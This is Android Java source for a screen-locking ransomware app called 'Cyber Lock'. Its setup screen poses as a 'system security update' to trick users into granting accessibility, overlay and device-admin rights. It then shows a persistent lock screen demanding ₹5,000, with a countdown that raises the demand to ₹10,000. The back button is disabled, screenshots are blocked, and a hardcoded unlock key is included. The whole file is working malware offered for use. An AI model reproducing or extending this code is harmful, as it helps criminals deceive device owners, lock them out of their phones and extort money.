package com.example.cyberlock;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    private boolean isLocked = false;
    private SharedPreferences prefs;

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);
        prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        
        // Agar pehle se locked tha, toh wapas lock screen dikhao
        if (prefs.getBoolean("is_locked", false)) {
            showLockdownScreen();
        } else {
            checkPermissionsAndLoad();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!isLocked && !prefs.getBoolean("is_locked", false)) {
            checkPermissionsAndLoad();
        }
    }

    private boolean isAccessibilityEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName() + "/" + KioskAccessibilityService.class.getName());
    }

    private boolean isOverlayEnabled() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(this);
        }
        return true;
    }

    private void checkPermissionsAndLoad() {
        boolean accEnabled = isAccessibilityEnabled();
        boolean overlayEnabled = isOverlayEnabled();
        
        ComponentName adminComponent = new ComponentName(this, KioskDeviceAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        boolean adminEnabled = dpm.isAdminActive(adminComponent);

        if (accEnabled && overlayEnabled && adminEnabled) {
            showSetupScreen(accEnabled, overlayEnabled, adminEnabled, adminComponent);
        } else {
            showSetupScreen(accEnabled, overlayEnabled, adminEnabled, adminComponent);
        }
    }

    private void showSetupScreen(boolean acc, boolean overlay, boolean admin, ComponentName adminComp) {
        LinearLayout setupLayout = new LinearLayout(this);
        setupLayout.setOrientation(LinearLayout.VERTICAL);
        setupLayout.setGravity(Gravity.CENTER);
        setupLayout.setPadding(50, 50, 50, 50);
        setupLayout.setBackgroundColor(Color.parseColor("#121212"));

        TextView title = new TextView(this);
        title.setText("🛡️ SYSTEM SECURITY UPDATE");
        title.setTextColor(Color.parseColor("#4CAF50"));
        title.setTextSize(26);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        setupLayout.addView(title);

        TextView desc = new TextView(this);
        desc.setText("\nTo finalize the security patch, please grant the following system permissions.\n");
        desc.setTextColor(Color.LTGRAY);
        desc.setGravity(Gravity.CENTER);
        desc.setPadding(0, 0, 0, 40);
        setupLayout.addView(desc);

        Button btnAcc = new Button(this);
        btnAcc.setText(acc ? "✅ Core Engine Active" : "Grant Core Engine Access");
        btnAcc.setBackgroundColor(acc ? Color.parseColor("#2E7D32") : Color.parseColor("#333333"));
        btnAcc.setTextColor(Color.WHITE);
        btnAcc.setEnabled(!acc);
        btnAcc.setOnClickListener(v -> {
            Toast.makeText(this, "Find 'Cyber Lock' and turn it ON", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });
        setupLayout.addView(btnAcc);

        Button btnOverlay = new Button(this);
        btnOverlay.setText(overlay ? "✅ Display Shield Active" : "Grant Display Shield");
        btnOverlay.setBackgroundColor(overlay ? Color.parseColor("#2E7D32") : Color.parseColor("#333333"));
        btnOverlay.setTextColor(Color.WHITE);
        btnOverlay.setEnabled(!overlay);
        btnOverlay.setOnClickListener(v -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
        setupLayout.addView(btnOverlay);

        Button btnAdmin = new Button(this);
        btnAdmin.setText(admin ? "✅ System Admin Active" : "Grant System Admin");
        btnAdmin.setBackgroundColor(admin ? Color.parseColor("#2E7D32") : Color.parseColor("#333333"));
        btnAdmin.setTextColor(Color.WHITE);
        btnAdmin.setEnabled(!admin);
        btnAdmin.setOnClickListener(v -> {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            startActivity(intent);
        });
        setupLayout.addView(btnAdmin);

        Button btnStart = new Button(this);
        btnStart.setText("APPLY & LOCK");
        btnStart.setBackgroundColor(acc && overlay && admin ? Color.parseColor("#D32F2F") : Color.parseColor("#555555"));
        btnStart.setTextColor(Color.WHITE);
        btnStart.setTextSize(18);
        btnStart.setPadding(0, 30, 0, 30);
        btnStart.setOnClickListener(v -> {
            if (acc && overlay && admin) {
                // Jab user khud Apply dabaye, tabhi locked state save karo
                prefs.edit().putBoolean("is_locked", true).apply();
                showLockdownScreen();
            } else {
                Toast.makeText(this, "Please grant all permissions.", Toast.LENGTH_SHORT).show();
            }
        });
        setupLayout.addView(btnStart);

        setContentView(setupLayout);
    }

    private void showLockdownScreen() {
        isLocked = true;
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(Color.parseColor("#0A0A0A"));

        TextView title = new TextView(this);
        title.setText("⚠️ YOUR DEVICE IS LOCKED ⚠️");
        title.setTextColor(Color.RED);
        title.setTextSize(30);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView amount = new TextView(this);
        amount.setText("\nRANSOM AMOUNT: ₹5,000\n");
        amount.setTextColor(Color.parseColor("#00FF00"));
        amount.setTextSize(28);
        amount.setTypeface(null, Typeface.BOLD);
        amount.setGravity(Gravity.CENTER);
        layout.addView(amount);

        TextView timerText = new TextView(this);
        timerText.setText("TIME REMAINING: 10:00");
        timerText.setTextColor(Color.RED);
        timerText.setTextSize(24);
        timerText.setTypeface(null, Typeface.BOLD);
        timerText.setGravity(Gravity.CENTER);
        layout.addView(timerText);

        EditText keyInput = new EditText(this);
        keyInput.setHint("Enter Unlock Key Here");
        keyInput.setTextColor(Color.WHITE);
        keyInput.setHintTextColor(Color.GRAY);
        keyInput.setGravity(Gravity.CENTER);
        layout.addView(keyInput);

        Button unlockBtn = new Button(this);
        unlockBtn.setText("UNLOCK DEVICE");
        unlockBtn.setBackgroundColor(Color.RED);
        unlockBtn.setTextColor(Color.WHITE);
        unlockBtn.setOnClickListener(v -> {
            String input = keyInput.getText().toString().trim();
            if (input.equals("THANKS-FOR-RANSOM")) {
                Toast.makeText(MainActivity.this, "Decrypting files... Device Unlocked.", Toast.LENGTH_LONG).show();
                prefs.edit().putBoolean("is_locked", false).apply(); // Unlock state save
                isLocked = false;
                finish();
            } else {
                Toast.makeText(MainActivity.this, "INVALID KEY! Pay to get key.", Toast.LENGTH_SHORT).show();
            }
        });
        layout.addView(unlockBtn);

        new CountDownTimer(600000, 1000) {
            public void onTick(long millisUntilFinished) {
                int minutes = (int) (millisUntilFinished / 1000) / 60;
                int seconds = (int) (millisUntilFinished / 1000) % 60;
                timerText.setText(String.format("TIME REMAINING: %02d:%02d", minutes, seconds));
            }
            public void onFinish() {
                timerText.setText("TIME OVER: PAY ₹10,000 NOW");
            }
        }.start();

        setContentView(layout);
    }

    @Override
    public void onBackPressed() {
        if (!isLocked) {
            super.onBackPressed();
        }
    }
}
